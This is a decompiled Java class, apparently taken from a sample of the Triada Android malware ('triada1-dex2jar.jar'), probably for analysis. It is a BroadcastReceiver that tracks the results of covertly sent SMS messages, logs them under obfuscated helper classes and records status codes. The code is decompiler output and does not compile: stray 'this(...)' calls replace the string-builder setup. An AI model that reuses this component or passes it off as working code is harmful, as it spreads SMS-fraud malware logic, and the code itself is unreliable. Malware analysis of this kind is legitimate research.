package com.android.essdk.eyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.essdk.eyou.b.e;
import com.android.essdk.eyou.e.b;

public class PlateService$MyServiceReceiver extends BroadcastReceiver {
  public PlateService$MyServiceReceiver(PlateService paramPlateService) {}
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    try {
      if (getResultCode() == -1) {
        StringBuilder stringBuilder1 = new StringBuilder();
        this("发短信监听已发结果Activity.RESULT_OK");
        b.b("PlateService", stringBuilder1.append(e.a().h(paramContext)).toString());
        e.a().e(paramContext, 101);
        stringBuilder1 = new StringBuilder();
        this("getResultCode()是：");
        b.b("PlateService", stringBuilder1.append(getResultCode()).toString());
        stringBuilder1 = new StringBuilder();
        this("发短信监听已发结果Activity.RESULT_OK");
        b.b("PlateService", stringBuilder1.append(e.a().h(paramContext)).toString());
      } else {
        if (getResultCode() != 1 && getResultCode() != 4)
          getResultCode(); 
        e.a().e(paramContext, 110);
      } 
      StringBuilder stringBuilder = new StringBuilder();
      this("发短信监听结果");
      b.b("PlateService", stringBuilder.append(e.a().h(paramContext)).toString());
    } catch (Exception exception) {
      exception.getStackTrace();
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/PlateService$MyServiceReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */